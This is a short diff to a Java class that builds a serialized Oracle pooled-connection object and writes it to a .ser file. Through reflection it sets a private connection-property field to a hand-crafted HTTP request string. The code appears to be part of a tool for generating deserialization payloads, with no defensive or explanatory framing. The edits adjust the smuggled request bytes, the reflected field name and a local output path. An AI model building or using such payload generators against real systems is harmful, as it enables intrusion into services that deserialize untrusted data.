@@ -16,7 +16,7 @@ public class PooledConnectionSerializer {
 		Properties props = new Properties();
 		String t = new String();
 		
-		t = "\n\nGET /pewpewpew?anything=here HTTP/1.1\n"+
+		t = "\naaaa\nGET /pewpewpew?anything=here HTTP/1.1\n"+
 		"Host: localhost\nAnything: here\nConnection: close\n"+
 		"\n\n"
 		;
@@ -35,7 +35,7 @@ public class PooledConnectionSerializer {
 		try {
 
 			Class<? extends OraclePooledConnection> klass = opc.getClass();
-			Field conProp = klass.getDeclaredField("m_connectionProperty");
+			Field conProp = klass.getDeclaredField("connectionProperty");
 			conProp.setAccessible(true);
 			conProp.set(opc, connectionProperty);
 
@@ -54,7 +54,7 @@ public class PooledConnectionSerializer {
 		}
 
 		try {
-			FileOutputStream fos = new FileOutputStream("jdbc.ser");
+			FileOutputStream fos = new FileOutputStream("D:\\prj\\SerJava\\jdbc.ser");
 			ObjectOutputStream oos = new ObjectOutputStream(fos);
 			oos.writeObject(opc);
 
